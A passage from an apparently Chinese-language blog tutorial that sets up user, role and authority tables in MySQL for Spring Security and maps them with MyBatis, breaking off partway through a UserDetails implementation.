class="hljs-string">&#x27;13700000002&#x27;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>username、password、isAccountNonExpired、isAccountNonLocked、isCredentialsNonExpired、isEnabled、authorities 这七个字段是 <code>userDetails</code> 接口的默认属性，一般在数据库表中要全部包含</li><li>email、phone_number 等字段，是我们自己扩展的字段。</li><li>虽然 camelCase 在 Java 中使用广泛，例如 phoneNumber，但在 SQL 表列名中更建议统一为 snake_case，例如 phone_number</li></ol></blockquote><p><span style="background:#fff88f">2. roles 表（角色表）</span></p><table><thead><tr><th>列名</th><th>数据类型</th><th>约束</th><th>默认值</th><th>索引</th><th>示例值</th><th>说明</th></tr></thead><tbody><tr><td><strong>role_id</strong></td><td>int</td><td>主键约束、自增属性</td><td>自增</td><td>主键索引</td><td>1</td><td>角色唯一标识符</td></tr><tr><td><strong>role_name</strong></td><td>varchar(20)</td><td>唯一约束</td><td></td><td>唯一索引</td><td>ROLE_ADMIN</td><td>角色名称，推荐全大写的格式 (Spring Security 约定以 <code>ROLE_</code> 开头)</td></tr></tbody></table><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 创建表<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> roles (<br>    role_id <span class="hljs-type">INT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY KEY</span>,<br>    role_name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">UNIQUE</span><br>) <span class="hljs-keyword">COMMENT</span>=<span class="hljs-string">&#x27;角色表&#x27;</span>;<br><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> roles <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">CONSTRAINT</span> unique_role_name <span class="hljs-keyword">UNIQUE</span> (role_name);<br><br><br># <span class="hljs-number">2.</span> 插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> roles (role_name) <span class="hljs-keyword">VALUES</span> <br>(<span class="hljs-string">&#x27;ROLE_ADMIN&#x27;</span>),<br>(<span class="hljs-string">&#x27;ROLE_USER&#x27;</span>),<br>(<span class="hljs-string">&#x27;ROLE_MANAGER&#x27;</span>),<br>(<span class="hljs-string">&#x27;ROLE_GUEST&#x27;</span>);<br></code></pre></td></tr></table></figure><p><span style="background:#fff88f">3. user_role 表（用户-角色关联表）</span></p><table><thead><tr><th>列名</th><th>数据类型</th><th>约束</th><th>索引</th><th>默认值</th><th>示例值</th><th>说明</th></tr></thead><tbody><tr><td><strong>user_id</strong></td><td>int</td><td>主键约束（与 role_id 联合主键）<br>外键约束（指向 users 表中的 user_id）</td><td>联合主键索引</td><td></td><td>1</td><td>users 表中的 id</td></tr><tr><td><strong>role_id</strong></td><td>int</td><td>主键约束（与 user_id 联合主键）<br>外键约束（指向 roles 表中的 role_id）</td><td>联合主键索引</td><td></td><td>1</td><td>roles 表中的 id</td></tr></tbody></table><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 创建表<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> user_role (<br>    user_id    <span class="hljs-type">INT</span>         <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    role_id    <span class="hljs-type">INT</span>         <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-keyword">PRIMARY KEY</span> (user_id, role_id),<br>    <span class="hljs-keyword">FOREIGN KEY</span> (user_id) <span class="hljs-keyword">REFERENCES</span> users (user_id),<br>    <span class="hljs-keyword">FOREIGN KEY</span> (role_id) <span class="hljs-keyword">REFERENCES</span> roles (role_id)<br>) ;<br><br><br># <span class="hljs-number">2.</span> 插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> user_role (user_id, role_id) <span class="hljs-keyword">VALUES</span><br>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>两表的关联表，一般是取其两表名的单数形式，以 <code>_</code> 进行衔接</li></ol></blockquote><p><span style="background:#fff88f">4. authorities 表（权限表）</span></p><table><thead><tr><th>列名</th><th>数据类型</th><th>约束</th><th>索引</th><th>默认值</th><th>示例值</th><th>说明</th></tr></thead><tbody><tr><td><strong>authority_id</strong></td><td>int</td><td>主键约束、自增属性</td><td>主键索引</td><td>自增</td><td>1</td><td>权限唯一标识</td></tr><tr><td><strong>authority_name</strong></td><td>varchar(50)</td><td>唯一约束</td><td>唯一索引</td><td></td><td>finance:invoice:approve</td><td>权限名称，推荐全小写的格式（常采用 模块：资源：操作 的命名方式）</td></tr></tbody></table><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 创建表<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> authorities (<br>    authority_id <span class="hljs-type">INT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY KEY</span>,<br>    authority_name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>)<br>) ENGINE=InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET=utf8mb4;<br><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> authorities <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">CONSTRAINT</span> unique_authority_name <span class="hljs-keyword">UNIQUE</span> (authority_name);<br><br><br># <span class="hljs-number">2.</span> 插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> authorities (authority_name) <span class="hljs-keyword">VALUES</span><br>    (<span class="hljs-string">&#x27;test:test:test&#x27;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>表名叫做 <code>authorities</code>，列名叫做 <code>authority_xxx</code></li></ol></blockquote><p><span style="background:#fff88f">5. role_authority 表（角色-权限关联表）</span></p><table><thead><tr><th>列名</th><th>数据类型</th><th>约束</th><th>索引</th><th>默认值</th><th>示例值</th><th>说明</th></tr></thead><tbody><tr><td><strong>role_id</strong></td><td>int</td><td>主键约束（与 authoritie_id 联合主键）<br>外键约束（指向 roles 表中的 role_id）</td><td>联合主键索引</td><td></td><td>1</td><td>roles 表中的 id</td></tr><tr><td><strong>authority_id</strong></td><td>int</td><td>主键约束（与 role_id 联合主键）<br>外键约束（指向 authorities 表中的 authoritie_id）</td><td>联合主键索引</td><td></td><td>1</td><td>authorities 表中的 id</td></tr></tbody></table><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 创建表<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> role_authority (<br>    role_id <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    authority_id <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-keyword">PRIMARY KEY</span> (role_id, authority_id),<br>    <span class="hljs-keyword">FOREIGN KEY</span> (role_id) <span class="hljs-keyword">REFERENCES</span> roles(role_id),<br>    <span class="hljs-keyword">FOREIGN KEY</span> (authority_id) <span class="hljs-keyword">REFERENCES</span> authorities(authority_id)<br>) ;<br><br><br># <span class="hljs-number">2.</span> 插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> role_authority (role_id, authority_id) <span class="hljs-keyword">VALUES</span><br>    (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><hr><h4 id="1-1-3-使用-Spring-Data-MyBatis-实现查询用户的基本信息和权限"><a href="#1-1-3-使用-Spring-Data-MyBatis-实现查询用户的基本信息和权限" class="headerlink" title="1.1.3. 使用 Spring Data MyBatis 实现查询用户的基本信息和权限"></a>1.1.3. 使用 Spring Data MyBatis 实现查询用户的基本信息和权限</h4><h5 id="1-1-3-1-前置步骤"><a href="#1-1-3-1-前置步骤" class="headerlink" title="1.1.3.1. 前置步骤"></a>1.1.3.1. 前置步骤</h5><p>详见笔记：Spring Data MyBatis</p><hr><h5 id="1-1-3-2-编写-User-Entity-类"><a href="#1-1-3-2-编写-User-Entity-类" class="headerlink" title="1.1.3.2. 编写 User Entity 类"></a>1.1.3.2. 编写 User Entity 类</h5><p>User Entity 类位于 <code>com.example.securitywithhttpsession.entity</code> 包下</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> class User &#123;<br><br><span class="hljs-comment">// users 表中的数据（用户基本信息）</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Integer</span> userId;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">String</span> username;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">String</span> password;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Integer</span> isAccountNonExpired;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Integer</span> isAccountNonLocked;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Integer</span> isCredentialsNonExpired;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Integer</span> isEnabled;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">String</span> email;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">String</span> phoneNumber;<br>    <br><span class="hljs-comment">// authorities 表中的数据（用户的权限，不要忘记添加这个）</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">List</span>&lt;SimpleGrantedAuthority&gt; authorities;<br><br>    <span class="hljs-comment">// getter 方法</span><br><span class="hljs-comment">// setter 方法</span><br><span class="hljs-comment">// equals 方法</span><br><span class="hljs-comment">// hashCode 方法</span><br><span class="hljs-comment">// toString 方法</span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>与数据库表映射的类通常称为 Entity 类，也可称为 DO 类或 PO 类，统属 POJO 类，通常只包含 getter、setter 、equals、hashCode、toString 方法及构造方法，不应包含业务逻辑方法</li><li>使用 MyBatisX 插件生成的 POJO 类默认包含 getter、setter、equals、hashCode、toString 方法，但不包含构造方法。<ol><li>我们可以手动补全有参和无参构造方法；</li><li>同时我么也可以删除自动生成的 equals、hashCode、toString 方法，改为使用 IDEA 生成</li></ol></li><li>本 User 类不仅与 Users 表映射，还包含了 authorities 表中的 <code>authoritie_name</code> 字段。因此，别忘了添加 <code>private List&lt;String&gt; authorities;</code> 及其对应的方法（包括 getter、setter、equals、hashCode、toString 方法以及构造方法）</li><li>数据库中的表名一般使用复数形式，如 users，而在 Java 中则采用单数形式命名，如 User</li></ol></blockquote><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/pring%20Security/image-20250630183241212.png"></p><hr><h5 id="1-1-3-3-编写-UserMapper-接口，并定义查询方法"><a href="#1-1-3-3-编写-UserMapper-接口，并定义查询方法" class="headerlink" title="1.1.3.3. 编写 UserMapper 接口，并定义查询方法"></a>1.1.3.3. 编写 UserMapper 接口，并定义查询方法</h5><p>User Entity 类位于 <code>com.example.securitywithhttpsession.mapper</code> 包下</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Mapper</span>  <br>public interface UserMapper &#123;  <br><br>    <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">getUserByUserName</span>(<span class="hljs-variable">@Param</span>(<span class="hljs-string">&quot;username&quot;</span>) String username) ;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="1-1-3-4-编写查询方法对应的-SQL-语句（编写-UserMapper-xml）"><a href="#1-1-3-4-编写查询方法对应的-SQL-语句（编写-UserMapper-xml）" class="headerlink" title="1.1.3.4. 编写查询方法对应的 SQL 语句（编写 UserMapper.xml）"></a>1.1.3.4. 编写查询方法对应的 SQL 语句（编写 UserMapper.xml）</h5><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span></span><br><span class="hljs-meta"><span class="language-xml">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="hljs-meta"><span class="language-xml">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.example.securitywithhttpsession.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.example.securitywithhttpsession.entity.User&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span>/&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isAccountnonexpired&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_accountNonExpired&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TINYINT&quot;</span>/&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isAccountnonlocked&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_accountNonLocked&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TINYINT&quot;</span>/&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isCredentialsnonexpired&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_credentialsNonExpired&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TINYINT&quot;</span>/&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isEnabled&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_enabled&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TINYINT&quot;</span>/&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;phoneNumber&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;phone_number&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;authorities&quot;</span> <span class="hljs-attr">ofType</span>=<span class="hljs-string">&quot;org.springframework.security.core.authority.SimpleGrantedAuthority&quot;</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">constructor</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">arg</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;authority_name&quot;</span> <span class="hljs-attr">javaType</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> /&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">constructor</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">collection</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">sql</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Base_Column_List&quot;</span>&gt;</span></span><br><span class="language-xml">        user_id,</span><br><span class="language-xml">        username,</span><br><span class="language-xml">        password,</span><br><span class="language-xml">        is_accountNonExpired,</span><br><span class="language-xml">        is_accountNonLocked,</span><br><span class="language-xml">        is_credentialsNonExpired,</span><br><span class="language-xml">        is_enabled,</span><br><span class="language-xml">        email,</span><br><span class="language-xml">        phone_number</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">sql</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUserByUserName&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span>&gt;</span></span><br><span class="language-xml">        SELECT</span><br><span class="language-xml">            users.user_id,</span><br><span class="language-xml">            users.username,</span><br><span class="language-xml">            users.password,</span><br><span class="language-xml">            users.is_accountNonExpired,</span><br><span class="language-xml">            users.is_accountNonLocked,</span><br><span class="language-xml">            users.is_credentialsNonExpired,</span><br><span class="language-xml">            users.is_enabled,</span><br><span class="language-xml">            users.email,</span><br><span class="language-xml">            users.phone_number,</span><br><span class="language-xml">            authorities.authority_name</span><br><span class="language-xml">        FROM users</span><br><span class="language-xml">                 LEFT JOIN user_role ON users.user_id = user_role.user_id</span><br><span class="language-xml">                 LEFT JOIN role_authority ON user_role.role_id = role_authority.role_id</span><br><span class="language-xml">                 LEFT JOIN authorities ON role_authority.authority_id = authorities.authority_id</span><br><span class="language-xml">        WHERE users.username = #</span><span class="hljs-template-variable">&#123;username&#125;</span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span></span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>username</code>、<code>password</code>、<code>is_accountNonExpired</code>、<code>is_accountNonLocked</code>、<code>is_credentialsNonExpired</code>、<code>is_enabled</code> 以及 <code>authority_name</code> 是必须要查询的字段，因为这些字段会被封装到 <code>CustomerUserDetailsImpl</code> 中，供 Spring Security 进行认证与授权使用。</li><li>其他字段是否查询，可以根据实际需求灵活决定。即使你没有将 <code>email</code>、<code>phoneNumber</code> 等扩展信息封装进 <code>CustomerUserDetailsImpl</code>，这个方法依然可以作为一个通用的用户信息查询入口来使用。比如你后续业务中需要查询 <code>email</code> ，完全也可以直接调用这个方法。换句话说，这个方法不仅仅是在封装 <code>CustomerUserDetailsImpl</code> 时用得上，未来在其他场景中也很可能会复用，所以稍微 “富余” 一些是没问题的。</li></ol></blockquote><hr><h4 id="1-1-4-实现-UserDetails-接口"><a href="#1-1-4-实现-UserDetails-接口" class="headerlink" title="1.1.4. 实现 UserDetails 接口"></a>1.1.4. 实现 UserDetails 接口</h4><p>我们通常会定义一个类 <code>CustomerUserDetailsImpl</code> 来实现 Spring Security 提供的 <code>UserDetails</code> 接口。那么，这个类到底是做什么用的呢？我们先来看一下 <code>UserDetails</code> 接口的源码：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserDetails</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Serializable</span> &#123;  <br><br><span class="hljs-comment">// 获取用户权限集合</span><br>    <span class="hljs-title class_">Collection</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GrantedAuthority</span>&gt; <span class="hljs-title function_">getAuthorities</span>();  <br>    <br>    <span class="hljs-comment">// 获取密码（加密后的密码）</span><br>    <span class="hljs-title class_">String</span> <span class="hljs-title function_">getPassword</span>();  <br>    <br><span class="hljs-comment">// 获取用户名（如 &quot;admin&quot;）</span><br>    <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUsername</span>();  <br>    <br><span class="hljs-comment">// 账户是否没过期（true 代表没过期，false 代表过期）</span><br>    <span class="hljs-keyword">default</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isAccountNonExpired</span>(<span class="hljs-params"></span>) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 默认返回 true</span><br>    &#125;  <br>    <span class="hljs-comment">// 账户是否没锁定</span><br>    <span class="hljs-keyword">default</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isAccountNonLocked</span>(<span class="hljs-params"></span>) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <br>    &#125;  <br>    <span class="hljs-comment">// 凭证（密码）是否没过期</span><br>    <span class="hljs-keyword">default</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isCredentialsNonExpired</span>(<span class="hljs-params"></span>) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <br>    &#125;  <br>    <span class="hljs-comment">// 账户是否启用</span><br>    <span class="hljs-keyword">default</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isEnabled</span>(<span class="hljs-params"></span>) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>Spring Security 是通过调用 <code>UserDetails</code> 接口中定义的方法来获取用户信息的（毕竟 Spring Security 并不了解你项目中具体使用了什么类、字段名是什么，对吧，所以不会直接从我们的 User Entity 中拿数据）。</p><p>但我们也注意到，<code>UserDetails</code> 毕竟只是一个接口，它的方法并没有默认实现和返回值。也就是说，当 Spring Security 调用这些接口方法时，由于接口本身没有具体实现，自然无法拿到到任何值。这也正是我们为什么需要实现一个 <code>CustomUserDetailsImpl</code> 类来实现这个接口的原因。我们必须为接口中的每个方法提供具体实现，确保它们能返回对应的值，这样当 Spring Security 调用这些方法时，才能拿到用户信息。</p><p>其实我们也发现了，像 <code>isAccountNonExpired()</code>、<code>isAccountNonLocked()</code>、<code>isCredentialsNonExpired()</code>、<code>isEnabled()</code> 这几个方法，Spring Security 是提供了默认值的；但另外三个关键方法（如 <code>getUsername()</code>、<code>getPassword()</code>、<code>getAuthorities()</code>）是没有默认实现的，也就是说我们至少必须实现这三个方法，否则编译会直接报错。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomerUserDetailsImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDetails</span> &#123;  <br><br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Collection</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GrantedAuthority</span>&gt; <span class="hljs-title function_">getAuthorities</span>(<span class="hljs-params"></span>) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getPassword</span>(<span class="hljs-params"></span>) &#123;  <br>        